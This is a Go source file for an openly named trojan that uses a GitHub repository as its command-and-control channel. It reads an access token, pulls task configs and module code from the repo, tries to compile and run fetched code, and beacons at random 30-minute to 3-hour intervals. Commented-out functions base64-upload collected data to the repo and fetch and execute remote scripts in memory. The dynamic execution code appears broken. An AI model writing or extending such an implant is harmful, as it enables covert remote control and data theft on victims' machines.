package main

import (
	"context"
	"go/ast"
	"go/parser"
	"go/token"
	"go/types"
	"reflect"

	// "encoding/base64"
	"encoding/json"
	"fmt"

	// "io"
	"log"
	"math/rand"

	// "net/http"
	"os"
	"sync"
	"time"

	"github.com/YarKhan02/Trojan/modules"
	// "github.com/dop251/goja"
	"github.com/google/go-github/v69/github"

	"golang.org/x/oauth2"
	"golang.org/x/tools/go/packages"
)

type Trojan struct {
	id         string
	config_file string
	data_path   string
	client     *github.Client
	ctx        context.Context
}

func NewTrojan(id string, config string) (*Trojan, error) {
	client, ctx, err := github_connect()
	if err != nil {
		return nil, err
	}

	return &Trojan{
		id:         id,
		config_file: fmt.Sprintf("%s.json", config),
		data_path:   fmt.Sprintf("data/%s/", id),
		client:     client,
		ctx:        ctx,
	}, nil
}

var moduleRegistry = map[string]func(args ...interface{}) interface{}{
	"dirlister":   modules.Dirlister,
	"environment": modules.Environment,
}

func (t *Trojan) get_config() ([]map[string]interface{}, error) {
	config_json, err := get_file_contents("config", t.config_file, t.client, t.ctx)
	if err != nil {
		return nil, fmt.Errorf("failed to get config: %v", err)
	}

	var config []map[string]interface{}
	err = json.Unmarshal([]byte(config_json), &config)
	if err != nil {
		return nil, fmt.Errorf("failed to unmarshal config: %v", err)
	}

	for _, task := range config {
		if moduleName, ok := task["modules"].(string); ok {
			if moduleFunc, exists := moduleRegistry[moduleName]; exists {
				moduleFunc(".")
			} else {
				fmt.Println("Module not found:", moduleName)
			}
		}
	}

	fmt.Println("[*] Config ---------------------")
	fmt.Println(config)

	return config, nil
}

// func (t *Trojan) module_runner(module string) {
// 	if moduleFunc, exists := moduleRegistry[module]; exists {
// 		result := moduleFunc()
// 		t.store_module_result(result)
// 	} else {
// 		fmt.Println("Module not found:", module)
// 	}
// }

// Dynamically compile, execute Go code, and capture output
func compileAndRun(sourceCode string) (string, error) {
	// Parse the source code into an AST
	fset := token.NewFileSet()
	node, err := parser.ParseFile(fset, "", sourceCode, parser.AllErrors)
	if err != nil {
		return "", fmt.Errorf("failed to parse source code: %v", err)
	}

	// Type check the AST
	conf := types.Config{Importer: nil}
	info := &types.Info{
		Types: make(map[ast.Expr]types.TypeAndValue),
	}
	_, err = conf.Check("cmd", fset, []*ast.File{node}, info)
	if err != nil {
		return "", fmt.Errorf("type checking failed: %v", err)
	}

	// Use go/packages to load the dynamically compiled package
	pkgs, err := packages.Load(&packages.Config{Mode: packages.LoadSyntax}, "cmd")
	if err != nil {
		return "", fmt.Errorf("failed to load package: %v", err)
	}

	// Use reflection to find and execute the "ExecutePayload" function
	for _, pkg := range pkgs {
		obj := pkg.Types.Scope().Lookup("ExecutePayload")
		if obj == nil {
			return "", fmt.Errorf("ExecutePayload function not found")
		}

		fn := reflect.ValueOf(obj)
		if fn.Kind() != reflect.Func {
			return "", fmt.Errorf("ExecutePayload is not a function")
		}

		// Invoke the function dynamically and capture the result
		results := fn.Call(nil)
		if len(results) > 0 {
			output := results[0].Interface().(string)
			return output, nil
		}
	}

	return "", fmt.Errorf("function executed but returned no output")
}

func (t *Trojan) module_runner(module string) {
	script, err := get_file_contents("modules", "environment.go", t.client, t.ctx)
	if err != nil {
		fmt.Printf("failed to get config: %v\n", err)
	}

	fmt.Println("[*] Script ---------------------", module)
	result, err := compileAndRun(script)
	if err != nil {
		fmt.Println("Error executing script:", err)
		return
	}
	fmt.Println("[*] Result ---------------------\n", result)

}

// func (t *Trojan) store_module_result(data interface{}) {
// 	timestamp := time.Now().Format(time.RFC3339)
// 	remote_path := fmt.Sprintf("data/%s/%s.data", t.id, timestamp)
// 	data_str := fmt.Sprintf("%v", data)
// 	bindata := []byte(data_str)
// 	encoded_data := base64.StdEncoding.EncodeToString(bindata)

// 	message := "Storing module result: "
// 	fileContent := &github.RepositoryContentFileOptions{
// 		Message: github.Ptr(message),
// 		Content: []byte(encoded_data),
// 	}

// 	user := "YarKhan02"
// 	repo := "Trojan"

// 	_, _, err := t.client.Repositories.CreateFile(t.ctx, user, repo, remote_path, fileContent)
// 	if err != nil {
// 		fmt.Println("Error storing result:", err)
// 	} else {
// 		fmt.Println("Stored module result in:", remote_path)
// 	}
// }

// Fetches and executes a remote script, then stores the result
// func (t *Trojan) executeRemoteScript(url string) {
// 	resp, err := http.Get(url)
// 	if err != nil {
// 		fmt.Println("Failed to fetch script:", err)
// 		return
// 	}
// 	defer resp.Body.Close()

// 	// Read script content (Base64 encoded)
// 	body, err := io.ReadAll(resp.Body)
// 	if err != nil {
// 		fmt.Println("Failed to read script:", err)
// 		return
// 	}

// 	// Decode Base64
// 	script, err := base64.StdEncoding.DecodeString(string(body))
// 	if err != nil {
// 		fmt.Println("Failed to decode script:", err)
// 		return
// 	}

// 	// Execute the script in memory using a JavaScript VM
// 	vm := goja.New()
// 	value, err := vm.RunString(string(script))
// 	if err != nil {
// 		fmt.Println("Execution error:", err)
// 		return
// 	}

// 	// Store result in a file
// 	t.store_module_result(value.String())

// 	fmt.Println("Script executed successfully.")
// }

func github_connect() (*github.Client, context.Context, error) {
	token, err := os.ReadFile("token.txt")
	if err != nil {
		panic(err)
	}

	ctx := context.Background()
	ts := oauth2.StaticTokenSource(&oauth2.Token{AccessToken: string(token)})
	tc := oauth2.NewClient(ctx, ts)

	client := github.NewClient(tc)

	return client, ctx, nil
}

func get_file_contents(dirname string, module_name string, client *github.Client, ctx context.Context) (string, error) {
	user := "YarKhan02"
	repo := "Trojan"
	filePath := dirname + "/" + module_name
	
	file_content, _, _, err := client.Repositories.GetContents(ctx, user, repo, filePath, nil)
	if err != nil {
		return "", fmt.Errorf("failed to fetch file: %v", err)
	}

	content, err := file_content.GetContent()
	if err != nil {
		return "", fmt.Errorf("failed to get content: %v", err)
	}
	return content, nil
}

func (t *Trojan) Run() {
	for {
		config, err := t.get_config()
		if err != nil {
			fmt.Println("Error getting config:", err)
			continue
		}

		var wg sync.WaitGroup

		for _, task := range config {
			moduleName, ok := task["modules"].(string)
			if !ok {
				continue
			}
			
			wg.Add(1)
			go func(module string) {
				defer wg.Done()
				t.module_runner(module) // Pass module name to module_runner
			} (moduleName)

			// Sleep for a random interval (1-10 sec) before starting the next module
			time.Sleep(time.Duration(rand.Intn(10)+1) * time.Second)
		}

		wg.Wait() // Wait for all goroutines to complete

		// Sleep for a random interval (30 min - 3 hours)
		time.Sleep(time.Duration(rand.Intn(3*60*60-30*60)+30*60) * time.Second)
	}
}

func main() {
	trojan, err := NewTrojan("1", "abc")
	if err != nil {
		log.Fatal(err)
	}

	trojan.Run()
}